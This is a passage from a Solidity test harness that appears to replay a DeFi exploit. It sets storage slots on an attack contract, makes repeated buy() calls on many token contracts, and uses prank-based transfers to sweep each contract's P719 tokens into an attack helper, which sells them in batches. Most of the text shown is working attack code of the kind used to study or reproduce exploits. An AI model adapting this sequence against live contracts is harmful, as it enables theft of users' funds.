                Addresses.attack_contract,
                bytes32(uint256(27)),
                bytes32(uint256(874360546426733832907650785785267834784495547632))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(28)),
                bytes32(uint256(1102498401704275588923272485606729751841701952553))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(29)),
                bytes32(uint256(672245254139421069159259621980402824673627205077))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(30)),
                bytes32(uint256(1056860743504273485421971054704400604518719735896))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(31)),
                bytes32(uint256(875504388877580279160524987715596576165785320354))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(32)),
                bytes32(uint256(1354798459307642430956922689749292326919164630799))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(33)),
                bytes32(uint256(266861267188075185057903281316398437927187743083))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(34)),
                bytes32(uint256(736832084120903407390953078429368378997517375222))
            );
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_C71170_46B5(Addresses.A_C71170_46B5).buy{value: 100000000000000000000}();
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_3720CB_B6E0(Addresses.A_3720CB_B6E0).buy{value: 100000000000000000000}();
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_97F8FB_ADB3(Addresses.A_97F8FB_ADB3).buy{value: 100000000000000000000}();
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_D229E5_38B4(Addresses.A_D229E5_38B4).buy{value: 100000000000000000000}();
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_56203C_9E0F(Addresses.A_56203C_9E0F).buy{value: 100000000000000000000}();
    }

    function flashCallback9() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(21)),
                bytes32(uint256(159368502770368336141594216705589913795332921016))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(22)),
                bytes32(uint256(1269037323586194141939199683205555575470563600720))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(23)),
                bytes32(uint256(1455326423976853426052847408901804701791267125024))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(24)),
                bytes32(uint256(562038303337891283827220389514357274462830086517))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(25)),
                bytes32(uint256(918921790492038318812780025538806866307169493215))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(26)),
                bytes32(uint256(59258109052621240723085059238703240689481391365))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(27)),
                bytes32(uint256(874360546426733832907650785785267834784495547632))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(28)),
                bytes32(uint256(1102498401704275588923272485606729751841701952553))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(29)),
                bytes32(uint256(672245254139421069159259621980402824673627205077))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(30)),
                bytes32(uint256(1056860743504273485421971054704400604518719735896))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(31)),
                bytes32(uint256(875504388877580279160524987715596576165785320354))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(32)),
                bytes32(uint256(1354798459307642430956922689749292326919164630799))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(33)),
                bytes32(uint256(266861267188075185057903281316398437927187743083))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(34)),
                bytes32(uint256(736832084120903407390953078429368378997517375222))
            );
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_D3C386_F1D1(Addresses.A_D3C386_F1D1).buy{value: 100000000000000000000}();
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_20EA9F_B27E(Addresses.A_20EA9F_B27E).buy{value: 100000000000000000000}();
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_7934B8_F8A5(Addresses.A_7934B8_F8A5).buy{value: 100000000000000000000}();
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_CF14D1_14D3(Addresses.A_CF14D1_14D3).buy{value: 100000000000000000000}();
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_3CC3D4_BEBF(Addresses.A_3CC3D4_BEBF).buy{value: 100000000000000000000}();
    }

    function flashCallback10() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(21)),
                bytes32(uint256(159368502770368336141594216705589913795332921016))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(22)),
                bytes32(uint256(1269037323586194141939199683205555575470563600720))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(23)),
                bytes32(uint256(1455326423976853426052847408901804701791267125024))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(24)),
                bytes32(uint256(562038303337891283827220389514357274462830086517))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(25)),
                bytes32(uint256(918921790492038318812780025538806866307169493215))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(26)),
                bytes32(uint256(59258109052621240723085059238703240689481391365))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(27)),
                bytes32(uint256(874360546426733832907650785785267834784495547632))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(28)),
                bytes32(uint256(1102498401704275588923272485606729751841701952553))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(29)),
                bytes32(uint256(672245254139421069159259621980402824673627205077))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(30)),
                bytes32(uint256(1056860743504273485421971054704400604518719735896))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(31)),
                bytes32(uint256(875504388877580279160524987715596576165785320354))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(32)),
                bytes32(uint256(1354798459307642430956922689749292326919164630799))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(33)),
                bytes32(uint256(266861267188075185057903281316398437927187743083))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(34)),
                bytes32(uint256(736832084120903407390953078429368378997517375222))
            );
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_98C2F7_6A4C(Addresses.A_98C2F7_6A4C).buy{value: 100000000000000000000}();
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_2C9318_547B(Addresses.A_2C9318_547B).buy{value: 100000000000000000000}();
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_A39962_60BE(Addresses.A_A39962_60BE).buy{value: 100000000000000000000}();
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_60CF4F_388A(Addresses.A_60CF4F_388A).buy{value: 100000000000000000000}();
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_1A4305_FC25(Addresses.A_1A4305_FC25).buy{value: 100000000000000000000}();
    }

    function flashCallback11() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(21)),
                bytes32(uint256(159368502770368336141594216705589913795332921016))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(22)),
                bytes32(uint256(1269037323586194141939199683205555575470563600720))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(23)),
                bytes32(uint256(1455326423976853426052847408901804701791267125024))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(24)),
                bytes32(uint256(562038303337891283827220389514357274462830086517))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(25)),
                bytes32(uint256(918921790492038318812780025538806866307169493215))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(26)),
                bytes32(uint256(59258109052621240723085059238703240689481391365))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(27)),
                bytes32(uint256(874360546426733832907650785785267834784495547632))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(28)),
                bytes32(uint256(1102498401704275588923272485606729751841701952553))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(29)),
                bytes32(uint256(672245254139421069159259621980402824673627205077))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(30)),
                bytes32(uint256(1056860743504273485421971054704400604518719735896))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(31)),
                bytes32(uint256(875504388877580279160524987715596576165785320354))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(32)),
                bytes32(uint256(1354798459307642430956922689749292326919164630799))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(33)),
                bytes32(uint256(266861267188075185057903281316398437927187743083))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(34)),
                bytes32(uint256(736832084120903407390953078429368378997517375222))
            );
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_8A6873_D9CA(Addresses.A_8A6873_D9CA).buy{value: 100000000000000000000}();
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_859551_E349(Addresses.A_859551_E349).buy{value: 100000000000000000000}();
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        {
            address created = Addresses.attack_helper_422F;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper_422F))._helper4();
        {
            Harness.vmExt()
                .store(
                    Addresses.attack_contract,
                    bytes32(uint256(21)),
                    bytes32(uint256(159368502770368336141594216705589913795332921016))
                );
            Harness.vmExt()
                .store(
                    Addresses.attack_contract,
                    bytes32(uint256(22)),
                    bytes32(uint256(1269037323586194141939199683205555575470563600720))
                );
            Harness.vmExt()
                .store(
                    Addresses.attack_contract,
                    bytes32(uint256(23)),
                    bytes32(uint256(1455326423976853426052847408901804701791267125024))
                );
            Harness.vmExt()
                .store(
                    Addresses.attack_contract,
                    bytes32(uint256(24)),
                    bytes32(uint256(562038303337891283827220389514357274462830086517))
                );
            Harness.vmExt()
                .store(
                    Addresses.attack_contract,
                    bytes32(uint256(25)),
                    bytes32(uint256(918921790492038318812780025538806866307169493215))
                );
            Harness.vmExt()
                .store(
                    Addresses.attack_contract,
                    bytes32(uint256(26)),
                    bytes32(uint256(59258109052621240723085059238703240689481391365))
                );
            Harness.vmExt()
                .store(
                    Addresses.attack_contract,
                    bytes32(uint256(27)),
                    bytes32(uint256(874360546426733832907650785785267834784495547632))
                );
            Harness.vmExt()
                .store(
                    Addresses.attack_contract,
                    bytes32(uint256(28)),
                    bytes32(uint256(1102498401704275588923272485606729751841701952553))
                );
            Harness.vmExt()
                .store(
                    Addresses.attack_contract,
                    bytes32(uint256(29)),
                    bytes32(uint256(672245254139421069159259621980402824673627205077))
                );
            Harness.vmExt()
                .store(
                    Addresses.attack_contract,
                    bytes32(uint256(30)),
                    bytes32(uint256(1056860743504273485421971054704400604518719735896))
                );
            Harness.vmExt()
                .store(
                    Addresses.attack_contract,
                    bytes32(uint256(31)),
                    bytes32(uint256(875504388877580279160524987715596576165785320354))
                );
            Harness.vmExt()
                .store(
                    Addresses.attack_contract,
                    bytes32(uint256(32)),
                    bytes32(uint256(1354798459307642430956922689749292326919164630799))
                );
            Harness.vmExt()
                .store(
                    Addresses.attack_contract,
                    bytes32(uint256(33)),
                    bytes32(uint256(266861267188075185057903281316398437927187743083))
                );
            Harness.vmExt()
                .store(
                    Addresses.attack_contract,
                    bytes32(uint256(34)),
                    bytes32(uint256(736832084120903407390953078429368378997517375222))
                );
            uint256 p719BalanceOfAEcb80013a2 = IERC20Like(Addresses.P719).balanceOf(Addresses.A_ECB800_13A2);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfAEcb80013a2;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_ECB800_13A2);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfA23359dE426 = IERC20Like(Addresses.P719).balanceOf(Addresses.A_23359D_E426);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfA23359dE426;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_23359D_E426);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfAFa492974ab = IERC20Like(Addresses.P719).balanceOf(Addresses.A_FA4929_74AB);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfAFa492974ab;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_FA4929_74AB);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfAC8dce6C5dd = IERC20Like(Addresses.P719).balanceOf(Addresses.A_C8DCE6_C5DD);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfAC8dce6C5dd;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_C8DCE6_C5DD);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfAAc2757232b = IERC20Like(Addresses.P719).balanceOf(Addresses.A_AC2757_232B);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfAAc2757232b;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_AC2757_232B);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfA8e2a27E688 = IERC20Like(Addresses.P719).balanceOf(Addresses.A_8E2A27_E688);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfA8e2a27E688;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_8E2A27_E688);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfAE5025309cd = IERC20Like(Addresses.P719).balanceOf(Addresses.A_E50253_09CD);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfAE5025309cd;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_E50253_09CD);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfA3533eb4d20 = IERC20Like(Addresses.P719).balanceOf(Addresses.A_3533EB_4D20);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfA3533eb4d20;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_3533EB_4D20);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfAC79c4c462e = IERC20Like(Addresses.P719).balanceOf(Addresses.A_C79C4C_462E);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfAC79c4c462e;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_C79C4C_462E);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfA3d2785Ae81 = IERC20Like(Addresses.P719).balanceOf(Addresses.A_3D2785_AE81);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfA3d2785Ae81;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_3D2785_AE81);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfA4f10141767 = IERC20Like(Addresses.P719).balanceOf(Addresses.A_4F1014_1767);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfA4f10141767;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_4F1014_1767);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfAF6d10d3b04 = IERC20Like(Addresses.P719).balanceOf(Addresses.A_F6D10D_3B04);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfAF6d10d3b04;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_F6D10D_3B04);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfA4e8015F0f6 = IERC20Like(Addresses.P719).balanceOf(Addresses.A_4E8015_F0F6);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfA4e8015F0f6;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_4E8015_F0F6);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfA1008836699 = IERC20Like(Addresses.P719).balanceOf(Addresses.A_100883_6699);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfA1008836699;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_100883_6699);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfABa4925F4d8 = IERC20Like(Addresses.P719).balanceOf(Addresses.A_BA4925_F4D8);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfABa4925F4d8;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_BA4925_F4D8);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfAD3868b3eee = IERC20Like(Addresses.P719).balanceOf(Addresses.A_D3868B_3EEE);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfAD3868b3eee;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_D3868B_3EEE);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfAC7117046b5 = IERC20Like(Addresses.P719).balanceOf(Addresses.A_C71170_46B5);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfAC7117046b5;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_C71170_46B5);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfA3720cbB6e0 = IERC20Like(Addresses.P719).balanceOf(Addresses.A_3720CB_B6E0);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfA3720cbB6e0;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_3720CB_B6E0);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfA97f8fbAdb3 = IERC20Like(Addresses.P719).balanceOf(Addresses.A_97F8FB_ADB3);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfA97f8fbAdb3;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_97F8FB_ADB3);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfAD229e538b4 = IERC20Like(Addresses.P719).balanceOf(Addresses.A_D229E5_38B4);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfAD229e538b4;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_D229E5_38B4);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfA56203c9e0f = IERC20Like(Addresses.P719).balanceOf(Addresses.A_56203C_9E0F);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfA56203c9e0f;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_56203C_9E0F);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfAD3c386F1d1 = IERC20Like(Addresses.P719).balanceOf(Addresses.A_D3C386_F1D1);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfAD3c386F1d1;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_D3C386_F1D1);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfA20ea9fB27e = IERC20Like(Addresses.P719).balanceOf(Addresses.A_20EA9F_B27E);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfA20ea9fB27e;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_20EA9F_B27E);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfA7934b8F8a5 = IERC20Like(Addresses.P719).balanceOf(Addresses.A_7934B8_F8A5);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfA7934b8F8a5;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_7934B8_F8A5);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfACf14d114d3 = IERC20Like(Addresses.P719).balanceOf(Addresses.A_CF14D1_14D3);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfACf14d114d3;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_CF14D1_14D3);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfA3cc3d4Bebf = IERC20Like(Addresses.P719).balanceOf(Addresses.A_3CC3D4_BEBF);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfA3cc3d4Bebf;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_3CC3D4_BEBF);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfA98c2f76a4c = IERC20Like(Addresses.P719).balanceOf(Addresses.A_98C2F7_6A4C);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfA98c2f76a4c;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_98C2F7_6A4C);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfA2c9318547b = IERC20Like(Addresses.P719).balanceOf(Addresses.A_2C9318_547B);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfA2c9318547b;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_2C9318_547B);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfAA3996260be = IERC20Like(Addresses.P719).balanceOf(Addresses.A_A39962_60BE);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfAA3996260be;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_A39962_60BE);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfA60cf4f388a = IERC20Like(Addresses.P719).balanceOf(Addresses.A_60CF4F_388A);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfA60cf4f388a;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_60CF4F_388A);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfA1a4305Fc25 = IERC20Like(Addresses.P719).balanceOf(Addresses.A_1A4305_FC25);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfA1a4305Fc25;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_1A4305_FC25);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfA8a6873D9ca = IERC20Like(Addresses.P719).balanceOf(Addresses.A_8A6873_D9CA);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfA8a6873D9ca;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_8A6873_D9CA);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
            uint256 p719BalanceOfA859551E349 = IERC20Like(Addresses.P719).balanceOf(Addresses.A_859551_E349);
            {
                {
                    uint256 transferFromAmount = p719BalanceOfA859551E349;
                    if (transferFromAmount != 0) {
                        Harness.vmExt().startPrank(Addresses.A_859551_E349);
                        IERC20Like(Addresses.P719).transfer(Addresses.attack_helper_422F, transferFromAmount);
                        Harness.vmExt().stopPrank();
                    }
                }
            }
        }
        {
            uint256 p719ApproveAllowance = type(uint256).max;
            IERC20Like(Addresses.P719).approve(address(this), p719ApproveAllowance);
        }
        IERC20Like(Addresses.P719).balanceOf(Addresses.attack_helper_422F);
        {
            uint256 p719TransferFromAmount = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_4023A1_525D, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount = 526636214289627321527;
            IContract_4023A1_525D(Addresses.A_4023A1_525D).sell(sellLiveAmount);
        }
        {
            uint256 p719TransferFromAmount_2 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_2;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_25671E_7C82, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_2 = 526636214289627321527;
            IContract_25671E_7C82(Addresses.A_25671E_7C82).sell(sellLiveAmount_2);
        }
        {
            uint256 p719TransferFromAmount_3 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_3;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_2018B0_3DBD, transferFromAmount);
